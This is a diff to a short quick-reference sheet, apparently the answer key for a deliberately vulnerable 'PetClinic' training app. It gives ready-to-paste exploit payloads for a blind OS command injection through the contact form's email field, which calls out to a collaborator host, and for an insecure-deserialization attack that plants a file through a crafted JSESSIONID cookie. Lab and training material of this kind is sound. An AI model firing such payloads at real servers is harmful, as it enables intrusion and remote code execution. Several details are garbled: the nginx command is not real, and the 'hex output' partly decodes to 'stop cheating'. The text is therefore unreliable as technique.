@@ -3,15 +3,19 @@ PetClinic Quick Reference
 Blind OSCI:
 - Location: /contact_submission email parameter (server side resolution of the email as being legitimate in the Contact Us page)
 - Controls: No immediate response, so you have to use built in Nginx tools to send a request to collaborator
-- Example Payload: email=test@test.com && /usr/bin/nginx -g webrequest -h <collaboratorURL>
-(URL encoded for easy pasting) email=test%40test.com%20&&%20/usr/bin/nginx%20-g%20webrequest%20-h%20<collaboratorURL>
+- Example Payload: email=test@test.com && /usr/bin/nginx -g webrequest -h collaboratorURL
+
+(URL encoded for easy pasting) email=test%40test.com%20&&%20/usr/bin/nginx%20-g%20webrequest%20-h%20collaboratorURL
 
 Insecure Deserialization: 
 - Location: JSESSIONID cookie
 - Controls: Only the CommonsCollections5 gadget chain works
 - Example Payload: (in command line) java -jar ysoserial.jar FileUpload1 CommonsCollections5 “write;/test;hihi” -o hex
+
 (hex output) 73746f70206368656174696e6773746f9caafe61e06450b536e430e364e834463dc95f6576c5536f3f382d4a0eb7263d19fbc7878485871843d2fd4474696e67
+
 (usage) JSESSIONID=73746f70206368656174696e6773746f9caafe61e06450b536e430e364e834463dc95f6576c5536f3f382d4a0eb7263d19fbc7878485871843d2fd4474696e67
+
 (proof) Navigate to /test and observe the file with the contents "hihi"
 
 
